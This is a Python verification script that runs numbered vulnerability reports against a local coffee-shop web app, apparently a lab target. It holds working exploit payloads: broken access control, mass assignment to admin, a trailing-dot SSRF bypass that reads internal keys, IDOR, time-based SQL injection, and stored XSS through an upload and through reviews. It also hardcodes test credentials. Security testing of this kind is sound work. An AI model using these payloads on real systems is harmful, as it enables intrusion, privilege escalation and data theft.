import requests, time, sys
sys.stdout.reconfigure(encoding='utf-8')

def run_tests():
    print("=== 1. Test Broken Access Control (Report #3 & #83) ===")
    r = requests.get('http://localhost:3000/api/admin/customers')
    print("Status:", r.status_code)
    users = r.json()
    print("Found users:", len(users))
    for u in users:
        print(f" - [{u['role']}] {u['name']}: {u['email']}")

    print("\n=== 2. Test Mass Assignment (Report #2, #15, #30) ===")
    # Login as customer Huy
    s = requests.Session()
    r = s.post('http://localhost:3000/api/auth/login', json={'email': 'huy@gmail.com', 'password': 'user123'})
    user = r.json().get('user')
    print(f"Before: User = {user['email']}, Role = {user['role']}, Loyalty Points = {user.get('loyalty_points')}")
    # Elevate to admin
    r = s.patch('http://localhost:3000/api/member/me', json={'role': 'admin', 'loyalty_points': 88888})
    updated = r.json().get('user')
    print(f"After Mass Assignment: Role = {updated['role']}, Loyalty Points = {updated.get('loyalty_points')}")

    print("\n=== 3. Test SSRF Trailing Dot Bypass (Report #18, #88, #89) ===")
    # Test blocked
    r_blocked = s.post('http://localhost:3000/api/admin/products/1/fetch-image', json={'url': 'http://ops-internal:8081/env'})
    print("Blocked host status:", r_blocked.status_code, r_blocked.json())
    # Test bypass 1
    r_bypass1 = s.post('http://localhost:3000/api/admin/products/1/fetch-image', json={'url': 'http://ops-internal.:8081/env'})
    print("Bypass 1 (ops-internal.):", r_bypass1.json().get('preview'))
    # Test bypass 2
    r_bypass2 = s.post('http://localhost:3000/api/admin/products/1/fetch-image', json={'url': 'http://supplier-feed.:8082/internal/keys'})
    print("Bypass 2 (supplier-feed.):", r_bypass2.json().get('preview'))

    print("\n=== 4. Test IDOR on Orders (Report #10, #16) ===")
    r_idor = s.get('http://localhost:3000/api/member/orders/10')
    print("IDOR Order #10:", r_idor.json())

    print("\n=== 5. Test Time-based SQLi (Report #4, #29, #57) ===")
    # Test 5.1: SQLi on category filter (GET /api/store/products?category=...)
    t0 = time.time()
    r_sqli_cat = s.get("http://localhost:3000/api/store/products?category=ca-phe-y'+AND+(SELECT+1+FROM+(SELECT+SLEEP(2))x)--+")
    dt_cat = time.time() - t0
    print(f"SQLi on category filter response in {round(dt_cat, 2)}s (Expected ~2s delay)")

    # Test 5.2: SQLi on profile email update (PATCH /api/member/me)
    t0 = time.time()
    r_sqli = s.patch('http://localhost:3000/api/member/me', json={'email': "huy@gmail.com' WHERE 1=1 AND (SELECT 1 FROM (SELECT SLEEP(2))x)-- "})
    dt = time.time() - t0
    print(f"SQLi on profile email response in {round(dt, 2)}s (Expected ~2s delay)")

    print("\n=== 6. Test Insecure File Upload / Stored XSS (Report #44, #82) ===")
    payload = '<script>alert(document.domain)</script><h1>Hacked via SVG/HTML Upload</h1>'
    r_up = s.post('http://localhost:3000/api/member/support/tickets/1/attachments', json={'filename': 'exploit.html', 'content': payload})
    print("Upload result:", r_up.json())
    r_check = requests.get('http://localhost:3000' + r_up.json()['attachmentUrl'])
    print("Served MIME:", r_check.headers.get('content-type'))
    print("Served content preview:", r_check.text[:50])

    print("\n=== 7. Test Review Submission & Admin Moderation (Stored XSS Flow) ===")
    # Khách hàng Huy gửi đánh giá kèm XSS payload
    xss_payload = '<details open ontoggle="alert(\'Stored-XSS-Moderation\')">Nhận xét cà phê cực phẩm</details>'
    r_rev = s.post('http://localhost:3000/api/store/reviews', json={'product_slug': 'americano', 'rating': 5, 'body': xss_payload})
    print("Review submit response:", r_rev.json())
    
    # Kiểm tra danh sách công khai (chưa duyệt -> không xuất hiện)
    r_pub = requests.get('http://localhost:3000/api/store/reviews').json()
    print("Public reviews count:", len(r_pub))

    # Admin lấy toàn bộ đánh giá (bao gồm pending) và duyệt
    admin_s = requests.Session()
    admin_s.post('http://localhost:3000/api/auth/login', json={'email': 'admin@gmail.com', 'password': 'Admin123!'})
    all_revs = admin_s.get('http://localhost:3000/api/admin/reviews').json()
    pending_revs = [r for r in all_revs if r.get('status') == 'pending']
    print(f"Admin found {len(all_revs)} total reviews, {len(pending_revs)} pending moderation.")

    if pending_revs:
        target_rev = pending_revs[0]
        print(f"Approving review #{target_rev['id']}...")
        r_app = admin_s.post(f"http://localhost:3000/api/admin/reviews/{target_rev['id']}/approve")
        print("Approval response:", r_app.json())

        # Kiểm tra lại danh sách công khai sau khi duyệt
        r_pub_after = requests.get('http://localhost:3000/api/store/reviews').json()
        print("Public reviews count after approval:", len(r_pub_after))

if __name__ == '__main__':
    run_tests()
